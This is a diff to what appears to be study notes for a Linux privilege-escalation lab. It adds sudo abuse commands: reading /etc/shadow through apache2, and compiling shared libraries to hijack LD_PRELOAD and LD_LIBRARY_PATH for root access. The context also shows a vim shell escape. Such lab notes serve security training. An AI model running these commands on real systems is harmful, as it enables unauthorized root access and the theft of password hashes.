@@ -193,10 +193,43 @@ sudo vim -c ':!/bin/sh'
 ![]()
 
 *Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.*
-   
+
+```cmd
+sudo apache2 -f /etc/shadow
+```
+
+![]()
+
 https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/
 
 ### Sudo - Environment Variables
+
+*Read and follow along with the above.*
+
+```cmd
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+```
+```cmd
+sudo LD_PRELOAD=/tmp/preload.so program-name-here
+```
+
+![]()
+
+```cmd
+ldd /usr/sbin/apache2
+```
+
+![]()
+
+```cmd
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+```
+```cmd
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
+
+![]()
+
 ### Cron Jobs - File Permissions
 ### Cron Jobs - PATH Environment Variable
 ### Cron Jobs - Wildcards
